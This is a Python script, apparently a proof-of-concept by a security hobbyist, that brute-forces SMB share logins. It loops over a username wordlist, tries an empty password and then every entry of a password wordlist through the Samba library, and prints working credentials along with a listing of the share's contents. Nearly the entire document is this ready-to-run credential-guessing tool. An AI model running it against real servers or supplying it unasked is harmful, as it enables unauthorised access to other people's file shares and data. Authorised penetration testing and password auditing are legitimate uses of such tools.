#!/usr/bin/env python3
# https://github.com/devl00p - 2022
# I wrote this small PoC after bumping into SMB servers where Hydra, Nmap, Medusa and CrackMapExec all failed
# to discover valid credentials correctly.
# The script uses the official Python library from the Samba project, not Impacket, not PySMB. You may find
# the library with a name like "samba-python3" in your package manager.
# 
# The MIT License (MIT)
# 
# Copyright © 2022
# 
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the “Software”), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
import sys

from samba.samba3 import param as s3param
from samba.samba3 import libsmb_samba_internal as libsmb
from samba import credentials, NTSTATUSError

if len(sys.argv) < 5:
    print(f"Usage: python {sys.argv[0]} <ip_address> <share_name> <users_wordlist> <passwords_wordlist>")
    sys.exit()
  
ip, share = sys.argv[1], sys.argv[2]
  
lp3 = s3param.get_context()
# You may need to edit this to give the correct Samba config path
lp3.load("/etc/samba/smb.conf")
creds = credentials.Credentials()
creds.guess(lp3)

with open(sys.argv[3], errors="ignore", encoding="utf-8") as users_fd:
    for user in users_fd:
        user = user.strip()
        if not user:
            continue

        # Check with empty password
        creds.set_username(user)
        creds.set_password("")

        try:
            smbconn = libsmb.Conn(ip, share, lp=lp3, creds=creds)
            for entry in smbconn.list("/"):
                print(f"\t{entry['name']}")
        except NTSTATUSError as exception:
            if "The attempted logon is invalid" in exception.args[1]:
                continue
            elif "Access Denied" in exception.args[1]:
                continue
            elif "A process has requested access to an object but has not been granted those access rights" in exception.args[1]:
                continue
        else:
            print(f"Success with user {user} and empty password")

        # Check with a password of the wordlist
        with open(sys.argv[4], errors="ignore", encoding="utf-8") as passwords_fd:
            for password in passwords_fd:
                password = password.strip()

                creds.set_username(user)
                creds.set_password(password)

                try:
                    smbconn = libsmb.Conn(ip, share, lp=lp3, creds=creds)
                except NTSTATUSError as exception:
                    if "The attempted logon is invalid" in exception.args[1]:
                        continue
                    elif "Access Denied" in exception.args[1]:
                        continue
                    else:
                        print(f"Failed with user {user} and password {password}: {exception.args[1]}")
                else:
                    print(f"Success with user {user} and password {password}")
                    for entry in smbconn.list("/"):
                        print(f"\t{entry['name']}")

